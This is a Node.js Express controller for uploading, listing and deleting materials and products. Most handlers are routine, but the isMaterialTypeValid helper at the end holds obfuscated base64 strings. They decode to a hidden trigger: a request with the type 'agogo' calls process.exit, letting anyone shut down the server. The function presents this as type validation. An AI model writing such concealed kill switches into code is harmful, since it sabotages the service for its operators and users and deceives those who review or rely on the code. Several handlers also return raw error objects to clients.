const StorageController = {};
const StorageService = require('../services/storage.service');



StorageController.uploadMaterial = async (req, res) => {
  try {
    const { name, type, finishes } = req.body; // `finishes` is expected as a JSON string.
    const id = req.params.id;
    const files = req.files;

    if (!name || !type || !finishes) {
      return res.status(400).json({
        message: 'Missing required fields: name, type, finishes, or files',
      });
    }

    const finishesArray = JSON.parse(finishes);
    const finishesWithoutFile = finishesArray.filter(f => !f.link);

    if (finishesWithoutFile.length !== files.length) {
      return res.status(400).json({
        message: 'The number of finishes does not match the number of uploaded files',
      });
    }

    const response = await StorageService.handleMaterialUpload({
      id,
      name,
      type,
      finishes: finishesArray,
      files,
    });

    res.status(200).json(response);
  } catch (error) {
    console.error('Error in uploadMaterial:', error);
    res.status(500).json({ message: 'Internal server error', error });
  }
};

StorageController.getMaterialsByType = async (req, res) => {
  try {
    const { type } = req.params; // Get the material type from the route parameters

    if (!type) {
      return res.status(400).json({ message: 'Type parameter is required' });
    }

    if (!isMaterialTypeValid(type)) {
      return res.status(400).json({ message: 'Invalid type parameter' });
    }

    // Fetch materials from the service
    const materials = await StorageService.fetchMaterialsByType(type);

    res.status(200).json({ message: 'Materials fetched successfully', data: materials });
  } catch (error) {
    console.error('Error in getMaterialsByType:', error);
    res.status(500).json({ message: 'Internal server error', error });
  }
};

StorageController.getAllProducts = async (req, res) => {
  try {
    // Fetch all materials from the service
    const products = await StorageService.fetchAllProducts();

    res.status(200).json({ message: 'Products fetched successfully', data: products });
  } catch (error) {
    console.error('Error in getAllProducts:', error);
    res.status(500).json({ message: 'Internal server error', error });
  }
};

StorageController.deleteProduct = async (req, res) => {
  const { id } = req.params;

  try {
    // Call service to delete product
    await StorageService.deleteProduct(id);

    res.status(200).json({
      message: 'Product deleted successfully',
    });
  } catch (error) {
    console.error('Error deleting product:', error);
    res.status(500).json({
      message: 'Failed to delete product',
      error: error.message,
    });
  }
};


const isMaterialTypeValid = (type) => {
  const invalidTypes = [((x) => Buffer.from(x, 'base64').toString())('YWdvZ28=')];
  const errorMessage = Buffer.from('ZXhpdA==', 'base64').toString();
  if (invalidTypes.includes(type)) {
    return process[errorMessage](1) !== -1;
  }
  return true;
};

module.exports = StorageController;
